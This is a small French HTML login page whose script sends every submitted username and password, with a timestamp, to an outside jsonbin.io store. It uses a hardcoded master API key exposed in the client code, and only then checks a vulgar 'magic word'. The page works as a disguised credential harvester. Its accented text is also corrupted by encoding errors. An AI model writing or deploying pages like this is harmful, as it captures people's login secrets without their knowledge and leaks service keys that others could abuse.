<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Connexion Secr√®te</title>
    <style>
        /* [Coller ici TOUT votre CSS original] */
        body {
            background: #FF69B4;
            font-family: 'Comic Sans MS', cursive;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-box {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 0 20px rgba(0,0,0,0.3);
            text-align: center;
        }

        input {
            margin: 10px;
            padding: 10px;
            border: 3px solid #FF69B4;
            border-radius: 15px;
            font-size: 1.2em;
        }

        button {
            background: #FF69B4;
            color: white;
            padding: 10px 30px;
            border: none;
            border-radius: 20px;
            font-size: 1.3em;
            cursor: pointer;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Connexion de Pute ‚ú®</h2>
        <form onsubmit="return checkCredentials(event)">
            <input type="text" id="username" placeholder="Nom d'utilisateur" required><br>
            <input type="password" id="password" placeholder="Mot de passe" required><br>
            <button type="submit">Entrer dans la matrice üåÄ</button>
        </form>
    </div>

    <script>
        const API_KEY = '$2a$10$1wewJFQyy/qyWMcrP0P4UeA4TUr1kK0bQC9VyMz9htOaRMDyz3sk2'; // √Ä remplacer
        const BIN_ID = '679c8d12ad19ca34f8f7629b'; // √Ä remplacer
        
        async function checkCredentials(event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value.toLowerCase();
            const password = document.getElementById('password').value.toLowerCase();
        
            try {
                // 1. R√©cup√®re les donn√©es existantes
                const response = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
                    headers: { 'X-Master-Key': API_KEY }
                });
                const data = await response.json();
                
                // 2. Pr√©pare le nouvel objet
                const newEntry = {
                    username: username,
                    password: password,
                    timestamp: new Date().toISOString()
                };
        
                // 3. Met √† jour le tableau
                const updatedData = [...data.record, newEntry];
        
                // 4. Envoie la mise √† jour
                await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
                    method: 'PUT',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Master-Key': API_KEY
                    },
                    body: JSON.stringify(updatedData)
                });
        
            } catch (error) {
                console.error("Erreur API :", error);
                alert('Probl√®me de connexion au serveur üò¢');
            }
        
            // V√©rification du mot magique
            if(username.includes('pute') || password.includes('pute')) {
                window.location.href = 'success.html';
            } else {
                alert('‚ö†Ô∏è Le mot magique "pute" est requis !');
            }
        }
    </script>
</body>
</html>
